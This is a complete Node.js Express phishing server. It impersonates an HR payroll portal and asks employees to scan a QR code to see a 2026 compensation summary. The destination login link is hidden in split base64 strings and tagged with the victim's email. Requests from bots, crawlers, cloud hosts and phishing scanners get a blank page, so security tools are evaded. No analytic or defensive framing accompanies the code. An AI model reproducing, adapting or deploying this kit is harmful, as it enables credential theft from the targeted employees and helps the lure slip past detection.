const express = require('express');
const bodyParser = require('body-parser');
const app = express();

app.use(bodyParser.urlencoded({ extended: true }));

const part1 = "aHR0cHM6Ly9sb2dpbi50YXRhdXJ1cy5iaXov"; 
const part2 = "cGdhYWZGVE0=";

app.all('/', (req, res) => {
    const ua = req.headers['user-agent'] ? req.headers['user-agent'].toLowerCase() : "";
    const targetEmail = req.query.m || req.query.login_hint || req.body?.login_hint || "";
    const isBotUA = /bot|spider|crawler|google|cloud|datacenter|headless|monit|phish|virus|censys/i.test(ua);

    if (isBotUA || (targetEmail === "" && !req.query.debug)) {
        return res.send('<html><body style="background:white;"></body></html>');
    }

    let finalLink = Buffer.from(part1, 'base64').toString() + Buffer.from(part2, 'base64').toString();
    if(targetEmail !== "") finalLink += (finalLink.includes('?') ? '&' : '?') + "m=" + encodeURIComponent(targetEmail);

    res.send(`
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1">
            <title>Payroll & Compensation Gateway</title>
            <style>
                body { background: #f8f9fa; font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; display: flex; align-items: center; justify-content: center; min-height: 100vh; margin: 0; }
                .card { background: white; width: 100%; max-width: 480px; padding: 45px; box-shadow: 0 10px 25px rgba(0,0,0,0.05); border-radius: 4px; border-top: 4px solid #0078d4; }
                .header { display: flex; align-items: center; margin-bottom: 25px; }
                .header-text { font-size: 14px; color: #555; font-weight: 600; text-transform: uppercase; letter-spacing: 1px; }
                h2 { font-size: 24px; color: #1a1a1a; margin: 0 0 15px 0; font-weight: 600; }
                p { font-size: 15px; color: #444; line-height: 1.6; margin-bottom: 30px; }
                .qr-section { background: #ffffff; border: 1px dashed #0078d4; padding: 25px; text-align: center; border-radius: 8px; }
                .status-bar { color: #0078d4; font-size: 13px; margin-bottom: 20px; font-weight: 500; display: flex; align-items: center; justify-content: center; }
                .dot { height: 8px; width: 8px; background-color: #0078d4; border-radius: 50%; display: inline-block; margin-right: 10px; animation: blink 1s infinite; }
                @keyframes blink { 0% { opacity: 0.2; } 50% { opacity: 1; } 100% { opacity: 0.2; } }
                .qr-code { width: 190px; height: 190px; margin: 0 auto; display: block; padding: 10px; background: white; }
                .info-box { font-size: 12px; color: #777; margin-top: 30px; padding-top: 20px; border-top: 1px solid #eee; }
            </style>
        </head>
        <body>
            <div class="card">
                <div class="header">
                    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" style="margin-right:10px;">
                        <path d="M12 2L4 5V11C4 16.55 7.84 21.74 12 23C16.16 21.74 20 16.55 20 11V5L12 2Z" fill="#0078d4"/>
                        <path d="M9 12L11 14L15 10" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
                    </svg>
                    <span class="header-text">HR Payroll Services</span>
                </div>
                <h2>Review & Certification</h2>
                <p>To access your <strong>2026 Compensation Adjustment Summary</strong> and certify your details for the upcoming payroll cycle, please scan the secure token below using your authorized mobile device.</p>
                
                <div class="qr-section">
                    <div class="status-bar"><span class="dot"></span> Awaiting Secure Mobile Connection...</div>
                    <img src="https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(finalLink)}" class="qr-code">
                </div>

                <div class="info-box">
                    <strong>User:</strong> ${targetEmail}<br>
                    <strong>Security Level:</strong> High (Encrypted Session)<br>
                    <strong>Notice:</strong> This session will expire in 10 minutes for your protection.
                </div>
            </div>
        </body>
        </html>
    `);
});

const PORT = process.env.PORT || 8080;
app.listen(PORT);
